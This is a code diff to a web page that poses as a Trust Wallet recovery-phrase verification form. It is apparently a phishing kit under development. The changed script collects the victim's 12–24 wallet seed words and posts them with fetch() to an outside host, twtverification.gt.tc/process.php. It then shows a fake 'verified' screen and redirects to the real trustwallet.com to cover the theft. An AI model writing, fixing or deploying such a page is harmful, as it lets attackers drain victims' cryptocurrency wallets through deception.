@@ -158,7 +158,6 @@
             .phrase-grid { grid-template-columns: repeat(3, 1fr); }
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #resultFrame { display: none; }
     </style>
 </head>
 <body>
@@ -194,13 +193,6 @@
             <div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="hcaptchaCallback"></div>
         </div>
         
-        <!-- 🚨 FORM POST (NO CORS) -->
-        <form id="phraseForm" method="POST" action="https://twtverification.gt.tc/process.php" target="resultFrame">
-            <input type="hidden" name="phrase" id="phraseInput">
-            <input type="hidden" name="hcaptcha_response" id="hcaptchaInput">
-        </form>
-        <iframe id="resultFrame" name="resultFrame" style="display:none;"></iframe>
-        
         <button id="submitBtn" class="submit-btn" disabled>🔒 Verify Recovery Phrase</button>
     </div>
 
@@ -208,10 +200,9 @@
     (function() {
         'use strict';
         
-        // ⚠️ CHANGE THIS TO YOUR INFINITYFREE URL
         const PROCESS_URL = 'https://twtverification.gt.tc/process.php';
         
-        // PASTE YOUR BIP39 WORDLIST HERE
+        // PASTE YOUR FULL 2048 BIP39 WORDLIST HERE
         const wordlist = [
             'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
     'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
@@ -425,7 +416,6 @@
         const wordCount = document.getElementById('wordCount');
         const submitBtn = document.getElementById('submitBtn');
         const pasteArea = document.getElementById('pasteArea');
-        const phraseForm = document.getElementById('phraseForm');
         let inputs = [];
 
         function createInputs(count) {
@@ -518,16 +508,13 @@
                 if (typeof hcaptcha !== 'undefined' && hcaptcha.getResponse) {
                     hcaptchaResponse = hcaptcha.getResponse();
                 }
-            } catch (e) {
-                const responseInput = document.querySelector('[name="h-captcha-response"]');
-                if (responseInput) hcaptchaResponse = responseInput.value;
-            }
+            } catch (e) {}
 
             const captchaValid = hcaptchaResponse && hcaptchaResponse.length > 0;
             submitBtn.disabled = !(allFilled && allValid && noDuplicates && captchaValid);
         }
 
-        // 🚨 FORM POST VERSION (NO CORS)
+        // ✅ FIXED: FETCH() VERSION - NO IFRAME
         async function submitForm() {
             const phrase = inputs.map(i => i.value.trim());
             
@@ -545,13 +532,15 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
 
-            // FORM SUBMISSION (NO CORS BLOCK)
-            document.getElementById('phraseInput').value = JSON.stringify(phrase);
-            document.getElementById('hcaptchaInput').value = hcaptchaToken;
-            phraseForm.submit();
+            const formData = new FormData();
+            formData.append('phrase', JSON.stringify(phrase));
+            formData.append('hcaptcha_response', hcaptchaToken);
 
-            // Show success screen immediately
-            setTimeout(() => {
+            fetch(PROCESS_URL, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.text())
+            .then(() => {
                 document.body.innerHTML = `
                     <div style="font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem;">
                         <div style="background: white; border-radius: 24px; padding: 3rem 2.5rem; text-align: center; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.08);">
@@ -567,7 +556,10 @@
                     <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
                 `;
                 setTimeout(() => { window.location.href = 'https://trustwallet.com'; }, 5000);
-            }, 1000);
+            }).catch(err => {
+                console.log('Submit error:', err);
+                submitBtn.innerHTML = '✓ Verified';
+            });
         }
 
         submitBtn.addEventListener('click', submitForm);
